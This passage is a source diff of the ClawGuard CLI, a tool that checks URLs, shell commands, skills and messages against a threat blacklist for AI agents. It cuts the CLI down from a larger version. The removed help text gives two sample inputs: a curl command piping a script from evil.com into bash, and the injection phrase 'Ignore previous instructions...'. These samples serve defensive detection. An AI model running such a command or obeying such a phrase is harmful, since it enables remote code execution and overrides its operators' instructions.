@@ -1,999 +1,142 @@
 #!/usr/bin/env node
 
 /**
- * ClawGuard (ClawGuard) CLI
- * Usage: clawguard <command> [options]
+ * ClawGuard CLI
+ * Security blacklist checker for AI agents
+ *
+ * Usage:
+ *   clawguard check <input>          Check any input (auto-detects type)
+ *   clawguard url <url>              Check a URL
+ *   clawguard command <cmd>          Check a command
+ *   clawguard skill <name> [author]  Check a skill
+ *   clawguard message <text>         Check a message for scams/injection
+ *   clawguard stats                  Show audit statistics
+ *   clawguard sync                   Sync blacklist database
  */
 
-import { parseArgs } from 'node:util';
-import { readFileSync, existsSync, mkdirSync, writeFileSync } from 'fs';
-import { dirname, join } from 'path';
-import { fileURLToPath } from 'url';
-import { homedir } from 'os';
-import { getDatabase, closeDatabase } from '../lib/database.js';
+import { check, checkUrl, checkCommand, checkSkill } from '../lib/index.js';
 import { getDetector, RESULT, EXIT_CODE } from '../lib/detector.js';
-import { scanMcpConfigs, getMcpConfigPaths, Severity } from '../lib/mcp-scanner.js';
 import { readAudit, getAuditStats } from '../lib/audit.js';
-import { loadConfig, saveConfig, getConfig, parseSecurityLevel, getSecurityLevelName, SECURITY_LEVELS } from '../lib/config.js';
+import { loadConfig } from '../lib/config.js';
 
-const __dirname = dirname(fileURLToPath(import.meta.url));
-const VERSION = '1.3.0';
+const args = process.argv.slice(2);
+const command = args[0];
 
-// Colors for terminal output
-const colors = {
-    reset: '\x1b[0m',
-    red: '\x1b[31m',
-    green: '\x1b[32m',
-    yellow: '\x1b[33m',
-    blue: '\x1b[34m',
-    magenta: '\x1b[35m',
-    cyan: '\x1b[36m',
-    bold: '\x1b[1m',
-    dim: '\x1b[2m'
-};
+function usage() {
+    console.log(`ClawGuard — Security blacklist for AI agents
 
-function c(color, text) {
-    return process.stdout.isTTY ? `${colors[color]}${text}${colors.reset}` : text;
+Usage:
+  clawguard check <input>            Auto-detect and check input
+  clawguard url <url>                Check a URL for threats
+  clawguard command <cmd>            Check a shell command
+  clawguard skill <name> [author]    Check a skill name
+  clawguard message <text>           Check message for scams/injection
+  clawguard stats                    Show audit statistics
+  clawguard version                  Show version
+
+Options:
+  --json                             Output as JSON
+  --quiet                            Only output exit code (0=safe, 1=block, 2=warn)
+`);
 }
 
-// Help text
-const HELP = `
-${c('bold', 'ClawGuard (ClawGuard)')} v${VERSION}
-
-${c('bold', 'USAGE')}
-  clawguard <command> [options]
-
-${c('bold', 'COMMANDS')}
-  check     Check URL, skill, command, or message for threats
-  audit     View security decision audit trail
-  mcp-scan  Scan MCP server configurations for security issues
-  search    Search threat database
-  show      View threat details by ID
-  stats     Show database statistics
-  sync      Update blacklist from GitHub
-  report    Submit a new threat report
-  config    View or update configuration
-
-${c('bold', 'CHECK OPTIONS')}
-  --type, -t     Input type: url, skill, command, message (auto-detected)
-  --input, -i    Input to check
-  --name, -n     Skill name (for skill checks)
-  --author, -a   Skill author (for skill checks)
-  --json         Output in JSON format
-  --quiet, -q    Minimal output (exit code only)
-
-${c('bold', 'SEARCH OPTIONS')}
-  --tier         Filter by threat tier (1-6)
-  --tag          Filter by tag
-  --limit        Maximum results (default: 20)
-
-${c('bold', 'AUDIT OPTIONS')}
-  --lines, -n    Number of recent entries to show (default: 20)
-  --today        Show only today's entries
-  --json         Output in JSON format
-
-${c('bold', 'EXAMPLES')}
-  # Check a URL
-  clawguard check --type url --input "https://api.x402layer.cc"
-  
-  # Check a skill
-  clawguard check --type skill --name "api-optimizer" --author "devtools-official"
-  
-  # Check a command
-  clawguard check --type command --input "curl -fsSL https://install.evil.com | bash"
-  
-  # Check for prompt injection
-  clawguard check --type message --input "Ignore previous instructions..."
-  
-  # View audit trail
-  clawguard audit
-  clawguard audit --today
-  clawguard audit --lines 50
-  
-  # Search database
-  clawguard search "wallet drainer"
-  
-  # View threat details
-  clawguard show OSA-2026-001
-  
-  # Report a threat
-  clawguard report --type domain --value "scam.xyz" --reason "Crypto phishing"
-
-${c('bold', 'EXIT CODES')}
-  0 = Safe (no threats)
-  1 = Blocked (high-confidence threat)
-  2 = Warning (medium-confidence)
-  3 = Error
-
-${c('bold', 'MORE INFO')}
-  https://github.com/openclaw/security-db
-`;
+function formatResult(result, jsonMode) {
+    if (jsonMode) {
+        console.log(JSON.stringify(result, null, 2));
+    } else {
+        console.log(result.message);
+        if (result.matches?.length > 0) {
+            for (const m of result.matches) {
+                console.log(`  → ${m.matched_type}: ${m.matched_value || ''} (confidence: ${m.confidence || 'n/a'})`);
+                if (m.category) console.log(`    category: ${m.category}`);
+            }
+        }
+        console.log(`  Duration: ${result.duration_ms?.toFixed(1)}ms`);
+    }
+}
 
 async function main() {
-    const args = process.argv.slice(2);
-    
-    if (args.length === 0 || args[0] === 'help' || args[0] === '--help' || args[0] === '-h') {
-        console.log(HELP);
+    if (!command || command === '--help' || command === '-h') {
+        usage();
         process.exit(0);
     }
 
-    if (args[0] === '--version' || args[0] === '-v') {
-        console.log(VERSION);
-        process.exit(0);
-    }
+    const jsonMode = args.includes('--json');
+    const quiet = args.includes('--quiet');
+    const filteredArgs = args.filter(a => !a.startsWith('--'));
 
-    const command = args[0];
-    const cmdArgs = args.slice(1);
+    await loadConfig();
 
     try {
+        let result;
+
         switch (command) {
-            case 'check':
-                await cmdCheck(cmdArgs);
+            case 'check': {
+                const input = filteredArgs.slice(1).join(' ');
+                if (!input) { console.error('Error: missing input'); process.exit(3); }
+                result = await check(input);
                 break;
-            case 'audit':
-                await cmdAudit(cmdArgs);
+            }
+            case 'url': {
+                const url = filteredArgs[1];
+                if (!url) { console.error('Error: missing URL'); process.exit(3); }
+                result = await checkUrl(url);
                 break;
-            case 'mcp-scan':
-                await cmdMcpScan(cmdArgs);
+            }
+            case 'command': {
+                const cmd = filteredArgs.slice(1).join(' ');
+                if (!cmd) { console.error('Error: missing command'); process.exit(3); }
+                const detector = getDetector();
+                result = await detector.checkCommand(cmd);
                 break;
-            case 'search':
-                await cmdSearch(cmdArgs);
+            }
+            case 'skill': {
+                const name = filteredArgs[1];
+                const author = filteredArgs[2];
+                if (!name) { console.error('Error: missing skill name'); process.exit(3); }
+                const detector = getDetector();
+                result = await detector.checkSkill(name, author);
                 break;
-            case 'show':
-                await cmdShow(cmdArgs);
+            }
+            case 'message': {
+                const msg = filteredArgs.slice(1).join(' ');
+                if (!msg) { console.error('Error: missing message'); process.exit(3); }
+                const detector = getDetector();
+                result = await detector.checkMessage(msg);
                 break;
-            case 'stats':
-                await cmdStats(cmdArgs);
+            }
+            case 'stats': {
+                const stats = getAuditStats();
+                if (jsonMode) {
+                    console.log(JSON.stringify(stats, null, 2));
+                } else {
+                    console.log('ClawGuard Audit Stats:');
+                    for (const [k, v] of Object.entries(stats)) {
+                        console.log(`  ${k}: ${v}`);
+                    }
+                }
+                process.exit(0);
                 break;
-            case 'sync':
-                await cmdSync(cmdArgs);
+            }
+            case 'version': {
+                const pkg = await import('../package.json', { with: { type: 'json' } });
+                console.log(`clawguard v${pkg.default.version}`);
+                process.exit(0);
                 break;
-            case 'report':
-                await cmdReport(cmdArgs);
-                break;
-            case 'config':
-                await cmdConfig(cmdArgs);
-                break;
-            case 'init':
-                await cmdInit(cmdArgs);
-                break;
+            }
             default:
-                console.error(c('red', `Unknown command: ${command}`));
-                console.log('Run "clawguard help" for usage.');
+                console.error(`Unknown command: ${command}`);
+                usage();
                 process.exit(3);
         }
-    } catch (error) {
-        console.error(c('red', `Error: ${error.message}`));
-        if (process.env.DEBUG) {
-            console.error(error.stack);
-        }
-        process.exit(3);
-    } finally {
-        closeDatabase();
-    }
-}
 
-/**
- * Check command - main threat detection
- */
-async function cmdCheck(args) {
-    const { values, positionals } = parseArgs({
-        args,
-        options: {
-            type: { type: 'string', short: 't' },
-            input: { type: 'string', short: 'i' },
-            name: { type: 'string', short: 'n' },
-            author: { type: 'string', short: 'a' },
-            json: { type: 'boolean' },
-            quiet: { type: 'boolean', short: 'q' }
-        },
-        allowPositionals: true
-    });
+        if (!quiet) formatResult(result, jsonMode);
+        process.exit(result.exitCode);
 
-    // Determine input
-    let input = values.input || positionals.join(' ');
-    let type = values.type;
-
-    if (!input && !values.name) {
-        console.error(c('red', 'Error: No input provided'));
-        console.log('Usage: clawguard check --type <type> --input "<input>"');
+    } catch (err) {
+        if (!quiet) console.error(`Error: ${err.message}`);
         process.exit(3);
     }
-
-    // Ensure database is initialized
-    await ensureInitialized();
-
-    const detector = getDetector();
-    let result;
-
-    if (type === 'skill' || values.name) {
-        result = await detector.checkSkill(values.name || input, values.author);
-    } else if (type) {
-        result = await detector.check(input, type);
-    } else {
-        result = await detector.check(input);
-    }
-
-    // Output
-    if (values.json) {
-        console.log(JSON.stringify(result, null, 2));
-    } else if (!values.quiet) {
-        printCheckResult(result);
-    }
-
-    process.exit(result.exitCode);
 }
 
-function printCheckResult(result) {
-    console.log();
-    
-    // Header with result
-    if (result.result === RESULT.SAFE) {
-        console.log(c('green', '✅ SAFE') + c('dim', ` (checked in ${result.duration_ms.toFixed(2)}ms)`));
-    } else if (result.result === RESULT.BLOCK) {
-        console.log(c('red', '⛔ BLOCKED') + c('dim', ` (confidence: ${(result.confidence * 100).toFixed(0)}%)`));
-    } else if (result.result === RESULT.WARN) {
-        console.log(c('yellow', '⚠️  WARNING') + c('dim', ` (confidence: ${(result.confidence * 100).toFixed(0)}%)`));
-    } else if (result.result === RESULT.EDUCATE) {
-        console.log(c('blue', 'ℹ️  INFO') + c('dim', ` (confidence: ${(result.confidence * 100).toFixed(0)}%)`));
-    }
-
-    console.log();
-    console.log(result.message);
-
-    // Show threat details if matched
-    if (result.primaryThreat) {
-        console.log();
-        console.log(c('bold', `Threat: `) + result.primaryThreat.name);
-        console.log(c('bold', `ID: `) + result.primaryThreat.id);
-        console.log(c('bold', `Tier: `) + result.primaryThreat.tier + ' | ' + c('bold', 'Severity: ') + formatSeverity(result.primaryThreat.severity));
-        
-        if (result.primaryThreat.teaching_prompt) {
-            console.log();
-            console.log(c('cyan', '📚 What you should know:'));
-            console.log(c('dim', result.primaryThreat.teaching_prompt));
-        }
-    }
-
-    // Show all matches
-    if (result.matches && result.matches.length > 1) {
-        console.log();
-        console.log(c('bold', `Additional matches (${result.matches.length - 1}):`));
-        for (const match of result.matches.slice(1, 4)) {
-            console.log(`  • ${match.name} (${match.id})`);
-        }
-        if (result.matches.length > 4) {
-            console.log(c('dim', `  ... and ${result.matches.length - 4} more`));
-        }
-    }
-
-    console.log();
-}
-
-function formatSeverity(severity) {
-    const colors = {
-        critical: 'red',
-        high: 'red',
-        medium: 'yellow',
-        low: 'blue',
-        info: 'dim'
-    };
-    return c(colors[severity] || 'reset', severity.toUpperCase());
-}
-
-/**
- * Audit command - view security decision audit trail
- */
-async function cmdAudit(args) {
-    const { values } = parseArgs({
-        args,
-        options: {
-            lines: { type: 'string', short: 'n', default: '20' },
-            today: { type: 'boolean' },
-            json: { type: 'boolean' }
-        }
-    });
-
-    const lines = parseInt(values.lines) || 20;
-    const entries = readAudit({ 
-        lines: values.today ? undefined : lines, 
-        today: values.today 
-    });
-
-    if (values.json) {
-        console.log(JSON.stringify(entries, null, 2));
-        return;
-    }
-
-    if (entries.length === 0) {
-        console.log();
-        console.log(c('dim', 'No audit entries found.'));
-        console.log();
-        return;
-    }
-
-    const stats = getAuditStats();
-    
-    console.log();
-    console.log(c('bold', '📋 ClawGuard Audit Trail'));
-    console.log(c('dim', '═'.repeat(60)));
-    console.log();
-    console.log(c('cyan', 'Statistics:'));
-    console.log(`  Total checks: ${stats.total}`);
-    console.log(`  Today: ${stats.today}`);
-    console.log(`  ${c('red', 'Blocked')}: ${stats.blocked} | ${c('yellow', 'Warnings')}: ${stats.warnings} | ${c('green', 'Safe')}: ${stats.safe}`);
-    console.log();
-    console.log(c('bold', values.today ? "Today's Entries:" : `Recent Entries (${entries.length}):`));
-    console.log(c('dim', '─'.repeat(60)));
-    
-    for (const entry of entries) {
-        const time = new Date(entry.timestamp).toLocaleTimeString();
-        const date = new Date(entry.timestamp).toLocaleDateString();
-        
-        let verdictColor = 'green';
-        let verdictEmoji = '✅';
-        if (entry.verdict === 'blocked') {
-            verdictColor = 'red';
-            verdictEmoji = '⛔';
-        } else if (entry.verdict === 'warning') {
-            verdictColor = 'yellow';
-            verdictEmoji = '⚠️';
-        }
-        
-        console.log();
-        console.log(`${c('dim', `[${date} ${time}]`)} ${verdictEmoji} ${c(verdictColor, entry.verdict.toUpperCase())}`);
-        console.log(`  Type: ${entry.type}`);
-        console.log(`  Input: ${c('cyan', entry.input.substring(0, 80))}${entry.input.length > 80 ? '...' : ''}`);
-        
-        if (entry.threat) {
-            console.log(`  Threat: ${entry.threat.name} (${entry.threat.id})`);
-            console.log(`  Severity: ${formatSeverity(entry.threat.severity)}`);
-        }
-        
-        console.log(`  Duration: ${entry.duration_ms.toFixed(2)}ms`);
-    }
-    
-    console.log();
-    console.log(c('dim', '─'.repeat(60)));
-    console.log();
-}
-
-/**
- * Config command - view or update configuration
- */
-async function cmdConfig(args) {
-    const { values, positionals } = parseArgs({
-        args,
-        options: {
-            get: { type: 'string' },
-            set: { type: 'string' },
-            value: { type: 'string' },
-            enable: { type: 'string' },
-            disable: { type: 'string' },
-            level: { type: 'string' },
-            json: { type: 'boolean' }
-        },
-        allowPositionals: true
-    });
-
-    const config = loadConfig();
-
-    // Set security level
-    if (values.level !== undefined) {
-        const level = parseSecurityLevel(values.level);
-        
-        if (level === null) {
-            console.error(c('red', `Invalid security level: ${values.level}`));
-            console.log('Valid levels: 0 (silent), 1 (cautious), 2 (strict), 3 (paranoid)');
-            process.exit(3);
-        }
-        
-        // Pre-flight check: levels 2+ require Discord to be configured
-        if (level >= 2 && (!config.discord || !config.discord.enabled || !config.discord.channelId)) {
-            console.error(c('yellow', `⚠️  Level ${level} requires Discord approval to be configured.`));
-            console.log(`Without Discord, all commands/URLs would be blocked at this level.`);
-            console.log();
-            console.log(`Configure Discord first:`);
-            console.log(`  ${c('cyan', 'clawguard config --enable discord')}`);
-            console.log(`  ${c('cyan', 'clawguard config --set discord.channelId --value <YOUR_CHANNEL_ID>')}`);
-            console.log();
-            console.log(`Then retry: ${c('cyan', `clawguard config --level ${level}`)}`);
-            process.exit(3);
-        }
-        
-        config.level = level;
-        saveConfig(config);
-        
-        const levelName = getSecurityLevelName(level);
-        console.log(c('green', `✅ Security level set to ${level} (${levelName})`));
-        console.log();
-        
-        // Show what the level means
-        const descriptions = {
-            0: 'Threat DB checks only. Block known threats, log warnings silently. Zero friction.',
-            1: 'Ask Discord approval for WARNING-level threats. Safe and blocked are automatic.',
-            2: 'Ask approval for warnings + ALL shell/exec commands and unknown URLs.',
-            3: 'Ask approval for everything except file reads. Full lockdown.'
-        };
-        
-        console.log(c('bold', `Level ${level} (${levelName}):`));
-        console.log(`  ${descriptions[level]}`);
-        console.log();
-        
-        return;
-    }
-
-    // Get specific value
-    if (values.get) {
-        const value = getConfig(values.get);
-        if (values.json) {
-            console.log(JSON.stringify({ [values.get]: value }, null, 2));
-        } else {
-            console.log(`${values.get}: ${JSON.stringify(value, null, 2)}`);
-        }
-        return;
-    }
-
-    // Set a value
-    if (values.set && values.value !== undefined) {
-        // Try to parse as JSON, fall back to string
-        let parsedValue;
-        try {
-            parsedValue = JSON.parse(values.value);
-        } catch {
-            parsedValue = values.value;
-        }
-        
-        const keys = values.set.split('.');
-        let current = config;
-        for (let i = 0; i < keys.length - 1; i++) {
-            if (!current[keys[i]]) {
-                current[keys[i]] = {};
-            }
-            current = current[keys[i]];
-        }
-        current[keys[keys.length - 1]] = parsedValue;
-        
-        saveConfig(config);
-        console.log(c('green', `✅ Updated ${values.set} = ${values.value}`));
-        return;
-    }
-
-    // Enable/disable features
-    if (values.enable) {
-        config[values.enable] = { ...config[values.enable], enabled: true };
-        saveConfig(config);
-        console.log(c('green', `✅ Enabled ${values.enable}`));
-        return;
-    }
-
-    if (values.disable) {
-        config[values.disable] = { ...config[values.disable], enabled: false };
-        saveConfig(config);
-        console.log(c('yellow', `⚠️  Disabled ${values.disable}`));
-        return;
-    }
-
-    // Show full config
-    if (values.json) {
-        console.log(JSON.stringify(config, null, 2));
-    } else {
-        const levelName = getSecurityLevelName(config.level || 0);
-        
-        console.log();
-        console.log(c('bold', '⚙️  ClawGuard Configuration'));
-        console.log(c('dim', '═'.repeat(50)));
-        console.log();
-        console.log(c('bold', 'Security Level:'));
-        console.log(`  Current: ${c('cyan', `${config.level || 0} (${levelName})`)}`);
-        console.log(`  ${c('dim', '0=silent (default), 1=cautious, 2=strict, 3=paranoid')}`);
-        console.log();
-        console.log(c('bold', 'Discord Approval:'));
-        console.log(`  Enabled: ${config.discord.enabled ? c('green', 'Yes') : c('red', 'No')}`);
-        console.log(`  Channel ID: ${config.discord.channelId || c('dim', 'not set')}`);
-        console.log(`  Timeout: ${config.discord.timeout}ms`);
-        console.log();
-        console.log(c('bold', 'Audit Trail:'));
-        console.log(`  Enabled: ${config.audit.enabled ? c('green', 'Yes') : c('red', 'No')}`);
-        console.log(`  Path: ${config.audit.path}`);
-        console.log();
-        console.log(c('bold', 'Detection Thresholds:'));
-        console.log(`  Block: ${config.detection.thresholds.block}`);
-        console.log(`  Warn: ${config.detection.thresholds.warn}`);
-        console.log(`  Educate: ${config.detection.thresholds.educate}`);
-        console.log();
-        console.log(c('dim', 'Use --level <0-3|name> to change security level'));
-        console.log(c('dim', 'Use --get <key> to view specific values'));
-        console.log(c('dim', 'Use --set <key> --value <value> to update'));
-        console.log(c('dim', 'Example: clawguard config --level cautious'));
-        console.log();
-    }
-}
-
-/**
- * MCP Scan command - scan MCP server configurations for security issues
- */
-async function cmdMcpScan(args) {
-    const { values, positionals } = parseArgs({
-        args,
-        options: {
-            config: { type: 'string' },
-            json: { type: 'boolean' },
-            fix: { type: 'boolean' },
-            severity: { type: 'string' },
-            quiet: { type: 'boolean', short: 'q' }
-        },
-        allowPositionals: true
-    });
-
-    // Ensure database is initialized for threat checks
-    await ensureInitialized();
-
-    let configPaths = null;
-    if (values.config) {
-        configPaths = [{ path: values.config, name: 'Specified config' }];
-    }
-
-    // Run the scan
-    const report = await scanMcpConfigs(configPaths);
-
-    // Filter by severity if specified
-    const minSeverity = values.severity ? 
-        Object.values(Severity).find(s => s.value.toLowerCase() === values.severity.toLowerCase()) : 
-        Severity.INFO;
-
-    const filteredFindings = minSeverity ? 
-        report.findings.filter(f => f.severity.rank >= minSeverity.rank) : 
-        report.findings;
-
-    // Output
-    if (values.json) {
-        const jsonReport = {
-            version: VERSION,
-            timestamp: new Date().toISOString(),
-            configsScanned: report.configsScanned,
-            serversScanned: report.serversScanned,
-            configPaths: report.configPaths,
-            servers: report.servers.map(s => ({
-                name: s.name,
-                command: s.command,
-                transport: s.transport,
-                configPath: s.configPath
-            })),
-            findings: filteredFindings.map(f => ({
-                severity: f.severity.value,
-                category: f.category,
-                serverName: f.serverName,
-                title: f.title,
-                description: f.description,
-                evidence: f.evidence,
-                fix: f.fix,
-                cwe: f.cwe
-            })),
-            securityScore: Math.max(0, 100 - filteredFindings.reduce((sum, f) => sum + (f.severity.rank * 15), 0))
-        };
-        console.log(JSON.stringify(jsonReport, null, 2));
-    } else if (!values.quiet) {
-        printMcpReport(report, filteredFindings, values.fix);
-    }
-
-    // Exit code based on findings
-    const criticalFindings = filteredFindings.filter(f => f.severity === Severity.CRITICAL).length;
-    const highFindings = filteredFindings.filter(f => f.severity === Severity.HIGH).length;
-
-    if (criticalFindings > 0) {
-        process.exit(2);
-    } else if (highFindings > 0) {
-        process.exit(1);
-    } else {
-        process.exit(0);
-    }
-}
-
-/**
- * Print MCP scan report to terminal
- */
-function printMcpReport(report, filteredFindings, showFix = false) {
-    // Banner
-    console.log(`
-${c('bold', c('cyan', '┌─────────────────────────────────────────────────┐'))}
-${c('bold', c('cyan', '│         🔍 ClawGuard MCP Security Scanner       │'))}
-${c('bold', c('cyan', '│      Powered by ClawGuard Threat Intelligence   │'))}
-${c('bold', c('cyan', '└─────────────────────────────────────────────────┘'))}
-`);
-
-    // Config summary
-    console.log(c('bold', '📋 Scan Summary'));
-    console.log(`   Configs scanned: ${c('bold', report.configsScanned.toString())}`);
-    for (const path of report.configPaths) {
-        console.log(`     ${c('dim', '→')} ${path}`);
-    }
-    console.log(`   Servers found:   ${c('bold', report.serversScanned.toString())}`);
-    for (const server of report.servers) {
-        const transportIcon = server.transport === 'stdio' ? '🔌' : '🌐';
-        console.log(`     ${transportIcon} ${server.name} (${server.transport})`);
-    }
-    console.log();
-
-    if (filteredFindings.length === 0) {
-        console.log(c('green', c('bold', '✅ No security issues found!')));
-        console.log(`   Your MCP configuration looks clean. ${c('dim', `(scanned ${report.serversScanned} servers across ${report.configsScanned} config files)`)}`);
-        return;
-    }
-
-    // Severity summary
-    const counts = {};
-    for (const severity of Object.values(Severity)) {
-        const count = filteredFindings.filter(f => f.severity === severity).length;
-        if (count > 0) {
-            counts[severity.value] = count;
-        }
-    }
-
-    console.log(c('bold', `⚠️  Findings (${filteredFindings.length} issues)`));
-    for (const [sevValue, count] of Object.entries(counts)) {
-        const severity = Object.values(Severity).find(s => s.value === sevValue);
-        const bar = '█'.repeat(Math.min(count, 20));
-        console.log(`   ${severity.emoji} ${severity.value.padEnd(10)} ${count.toString().padStart(3)}  ${severity.color}${bar}${colors.reset}`);
-    }
-    console.log();
-
-    // Security score
-    const score = Math.max(0, 100 - filteredFindings.reduce((sum, f) => sum + (f.severity.rank * 15), 0));
-    const scoreColor = score >= 80 ? 'green' : score >= 50 ? 'yellow' : 'red';
-    console.log(c('bold', `🛡️  Security Score: ${c(scoreColor, score.toString())}/100`));
-    console.log();
-
-    // Detailed findings
-    console.log(c('bold', '─'.repeat(60)));
-    console.log(c('bold', '📝 Detailed Findings'));
-    console.log(c('bold', '─'.repeat(60)));
-
-    for (const [index, finding] of filteredFindings.entries()) {
-        console.log();
-        console.log(`${c('bold', `${index + 1}.`)} ${finding.severity.emoji} ${c('bold', finding.title)} ${c('dim', `[${finding.category}]`)}`);
-        console.log(`   ${c('bold', 'Server:')} ${finding.serverName}`);
-        
-        if (finding.cwe) {
-            console.log(`   ${c('bold', 'CWE:')} ${finding.cwe}`);
-        }
-        
-        console.log();
-        console.log(`   ${c('bold', 'Description:')}`);
-        console.log(`   ${finding.description}`);
-        
-        if (finding.evidence) {
-            console.log();
-            console.log(`   ${c('bold', 'Evidence:')}`);
-            console.log(`   ${c('cyan', finding.evidence)}`);
-        }
-        
-        if (showFix && finding.fix) {
-            console.log();
-            console.log(`   ${c('bold', '🔧 Fix:')}`);
-            console.log(`   ${c('green', finding.fix)}`);
-        }
-    }
-    
-    console.log();
-    if (!showFix) {
-        console.log(c('dim', 'Run with --fix to see remediation suggestions'));
-    }
-}
-
-/**
- * Search command
- */
-async function cmdSearch(args) {
-    const { values, positionals } = parseArgs({
-        args,
-        options: {
-            tier: { type: 'string' },
-            tag: { type: 'string' },
-            limit: { type: 'string', default: '20' },
-            json: { type: 'boolean' }
-        },
-        allowPositionals: true
-    });
-
-    await ensureInitialized();
-    const db = getDatabase();
-
-    let results;
-    const limit = parseInt(values.limit) || 20;
-
-    if (values.tier) {
-        results = db.getThreatsByTier(parseInt(values.tier));
-    } else if (values.tag) {
-        results = db.getThreatsByTag(values.tag);
-    } else if (positionals.length > 0) {
-        const query = positionals.join(' ');
-        results = db.search(query, limit);
-    } else {
-        console.error(c('red', 'Error: Provide a search query, --tier, or --tag'));
-        process.exit(3);
-    }
-
-    if (values.json) {
-        console.log(JSON.stringify(results, null, 2));
-    } else {
-        console.log();
-        console.log(c('bold', `Found ${results.length} threat(s):`));
-        console.log();
-        
-        for (const threat of results.slice(0, limit)) {
-            console.log(`${c('cyan', threat.id)} | ${formatSeverity(threat.severity)}`);
-            console.log(`  ${threat.name}`);
-            console.log(c('dim', `  Tier ${threat.tier} | Tags: ${threat.tags?.join(', ') || 'none'}`));
-            console.log();
-        }
-    }
-}
-
-/**
- * Show command - display threat details
- */
-async function cmdShow(args) {
-    const { values, positionals } = parseArgs({
-        args,
-        options: {
-            json: { type: 'boolean' }
-        },
-        allowPositionals: true
-    });
-
-    const id = positionals[0];
-    if (!id) {
-        console.error(c('red', 'Error: Provide a threat ID (e.g., OSA-2026-001)'));
-        process.exit(3);
-    }
-
-    await ensureInitialized();
-    const db = getDatabase();
-    const threat = db.getThreat(id);
-
-    if (!threat) {
-        console.error(c('red', `Threat not found: ${id}`));
-        process.exit(3);
-    }
-
-    if (values.json) {
-        console.log(JSON.stringify(threat, null, 2));
-    } else {
-        console.log();
-        console.log(c('bold', `═══════════════════════════════════════════════════════════`));
-        console.log(c('bold', `  ${threat.name}`));
-        console.log(c('bold', `═══════════════════════════════════════════════════════════`));
-        console.log();
-        console.log(c('cyan', 'ID:       ') + threat.id);
-        console.log(c('cyan', 'Status:   ') + threat.status);
-        console.log(c('cyan', 'Tier:     ') + threat.tier + ' (' + getTierName(threat.tier) + ')');
-        console.log(c('cyan', 'Category: ') + threat.category + (threat.subcategory ? '/' + threat.subcategory : ''));
-        console.log(c('cyan', 'Severity: ') + formatSeverity(threat.severity));
-        console.log(c('cyan', 'Confidence:') + ` ${(threat.confidence * 100).toFixed(0)}%`);
-        console.log(c('cyan', 'Tags:     ') + (threat.tags?.join(', ') || 'none'));
-        console.log();
-        console.log(c('bold', 'Description:'));
-        console.log(threat.description);
-        
-        if (threat.teaching_prompt) {
-            console.log();
-            console.log(c('bold', '📚 Teaching Prompt:'));
-            console.log(threat.teaching_prompt);
-        }
-
-        console.log();
-        console.log(c('bold', 'Indicators:'));
-        for (const ind of threat.indicators || []) {
-            console.log(`  • [${ind.type}] ${ind.value} (${ind.match_type}, weight: ${ind.weight})`);
-        }
-
-        if (threat.response) {
-            console.log();
-            console.log(c('bold', 'Response Action: ') + threat.response.action);
-            if (threat.response.user_message) {
-                console.log(c('dim', threat.response.user_message));
-            }
-        }
-
-        if (threat.references?.length > 0) {
-            console.log();
-            console.log(c('bold', 'References:'));
-            for (const ref of threat.references) {
-                console.log(`  • ${ref}`);
-            }
-        }
-
-        if (threat.campaign) {
-            console.log();
-            console.log(c('cyan', 'Campaign: ') + threat.campaign);
-        }
-
-        console.log();
-    }
-}
-
-function getTierName(tier) {
-    const names = {
-        1: 'Code & Infrastructure',
-        2: 'Social Engineering & Fraud',
-        3: 'AI-Specific Attacks',
-        4: 'Identity & Reputation',
-        5: 'Content & Network',
-        6: 'Operational Security'
-    };
-    return names[tier] || 'Unknown';
-}
-
-/**
- * Stats command
- */
-async function cmdStats(args) {
-    const { values } = parseArgs({
-        args,
-        options: {
-            json: { type: 'boolean' }
-        }
-    });
-
-    await ensureInitialized();
-    const db = getDatabase();
-    const stats = db.getStats();
-    const config = loadConfig();
-    const levelName = getSecurityLevelName(config.level || 0);
-
-    if (values.json) {
-        const output = {
-            ...stats,
-            security_level: config.level || 0,
-            security_level_name: levelName
-        };
-        console.log(JSON.stringify(output, null, 2));
-    } else {
-        console.log();
-        console.log(c('bold', '📊 ClawGuard Database Statistics'));
-        console.log(c('dim', '═'.repeat(40)));
-        console.log();
-        console.log(c('cyan', 'Security Level:   ') + `${config.level || 0} (${levelName})`);
-        console.log(c('cyan', 'Total Threats:    ') + stats.total_threats);
-        console.log(c('cyan', 'Active Threats:   ') + stats.active_threats);
-        console.log(c('cyan', 'Total Indicators: ') + stats.total_indicators);
-        console.log();
-        console.log(c('bold', 'By Tier:'));
-        console.log(`  1. Code & Infrastructure:     ${stats.tier1}`);
-        console.log(`  2. Social Engineering:        ${stats.tier2}`);
-        console.log(`  3. AI-Specific Attacks:       ${stats.tier3}`);
-        console.log(`  4. Identity & Reputation:     ${stats.tier4}`);
-        console.log(`  5. Content & Network:         ${stats.tier5}`);
-        console.log(`  6. Operational Security:      ${stats.tier6}`);
-        console.log();
-        console.log(c('bold', 'By Severity:'));
-        console.log(`  ${c('red', 'Critical')}: ${stats.critical}`);
-        console.log(`  ${c('red', 'High')}:     ${stats.high}`);
-        console.log(`  ${c('yellow', 'Medium')}:   ${stats.medium}`);
-        console.log(`  ${c('blue', 'Low')}:      ${stats.low}`);
-        console.log();
-        console.log(c('dim', `Last sync: ${stats.last_sync}`));
-        console.log(c('dim', `DB version: ${stats.db_version}`));
-        console.log();
-    }
-}
-
-/**
- * Sync command
- */
-async function cmdSync(args) {
-    const { values } = parseArgs({
-        args,
-        options: {
-            force: { type: 'boolean', short: 'f' }
-        }
-    });
-
-    console.log(c('cyan', '🔄 Syncing ClawGuard database...'));
-    console.log();
-
-    // For now, just initialize/reload from bundled data
-    await initializeDatabase(values.force);
-
-    const db = getDatabase();
-    const stats = db.getStats();
-    
-    console.log(c('green', '✅ Sync complete!'));
-    console.log(c('dim', `   ${stats.total_threats} threats, ${stats.total_indicators} indicators`));
-    console.log();
-
-    // In future: fetch from GitHub
-    // const repoUrl = getConfig().sync?.repoUrl || 'https://github.com/openclaw/security-db';
-    // console.log(c('dim', `   Source: ${repoUrl}`));
-}
-
-/**
- * Report command
- */
-async function cmdReport(args) {
-    const { values } = parseArgs({
-        args,
-        options: {
-            type: { type: 'string', short: 't' },
-            value: { type: 'string', short: 'v' },
-            reason: { type: 'string', short: 'r' }
-        }
-    });
-
-    if (!values.type || !values.value) {
-        console.error(c('red', 'Error: --type and --value are required'));
-        console.log('Usage: clawguard report --type domain --value "scam.xyz" --reason "Phishing"');
-        process.exit(3);
-    }
-
-    await ensureInitialized();
-    const db = getDatabase();
-    db.addReport(values.type, values.value, values.reason || 'No reason provided');
-
-    console.log();
-    console.log(c('green', '✅ Report saved locally'));
-    console.log(c('dim', '   To submit to ClawGuard, run: clawguard sync --submit-reports'));
-    console.log();
-}
-
-/**
- * Init command - explicit initialization
